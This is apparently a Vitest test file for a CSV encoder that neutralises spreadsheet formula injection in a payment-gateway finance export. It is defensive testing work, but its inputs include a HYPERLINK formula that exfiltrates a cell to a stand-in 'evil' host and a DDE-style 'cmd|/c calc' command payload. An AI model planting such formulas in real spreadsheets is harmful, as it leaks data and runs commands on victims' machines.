import { describe, it, expect } from 'vitest';
import { cell } from './csv';

/**
 * Guards the Finance CSV export against spreadsheet formula injection (SECURITY_RISKS R17):
 * buyerName/buyerEmail come from the payment gateway, so a value Excel/Sheets would evaluate as
 * a formula must be neutralized — while staying RFC-4180 correct for ordinary values.
 */
describe('cell (CSV encoding)', () => {
	it('passes plain values through unchanged', () => {
		expect(cell('GCash')).toBe('GCash');
		expect(cell('Juan Dela Cruz')).toBe('Juan Dela Cruz');
		expect(cell('')).toBe('');
	});

	it('RFC-4180 quotes values containing comma, quote, or newline', () => {
		expect(cell('a,b')).toBe('"a,b"');
		expect(cell('a"b')).toBe('"a""b"');
		expect(cell('a\nb')).toBe('"a\nb"');
	});

	it('RFC-4180 quotes a buyer value with a non-leading carriage return', () => {
		// A mid-string \r isn't caught by the leading-char formula guard, so it must still be
		// quoted — a bare CR would otherwise break the record on parse.
		expect(cell('Juan\rCruz')).toBe('"Juan\rCruz"');
	});

	it('neutralizes formula-trigger leading characters with a single quote', () => {
		// Plain payloads (no comma/quote/newline/CR) → only the formula prefix applies, no quoting.
		for (const lead of ['=', '+', '-', '@', '\t']) {
			expect(cell(`${lead}cmd`)).toBe(`'${lead}cmd`);
		}
		// A leading \r is both a formula trigger AND a record-breaking char, so it's
		// prefixed AND RFC-4180 quoted.
		expect(cell('\rcmd')).toBe('"\'\rcmd"');
	});

	it('neutralizes a real injection payload (HYPERLINK exfil)', () => {
		// Contains " and , so it's prefixed AND RFC-quoted: the cell opens with `"'` — quote then
		// the formula guard — so a spreadsheet sees plain text, never a formula.
		const out = cell('=HYPERLINK("https://evil/?"&A1,"Receipt")');
		expect(out.startsWith('"\'')).toBe(true);
	});

	it('guards AND quotes when a formula value also needs RFC-4180 quoting', () => {
		// leading '=' → prefixed with '; the comma then forces quoting; the inner " is doubled.
		expect(cell('=cmd|"/c calc",x')).toBe('"\'=cmd|""/c calc"",x"');
	});

	it('does not treat a non-leading =/+/-/@ as a formula', () => {
		expect(cell('a=b')).toBe('a=b');
		expect(cell('1+1')).toBe('1+1');
	});
});
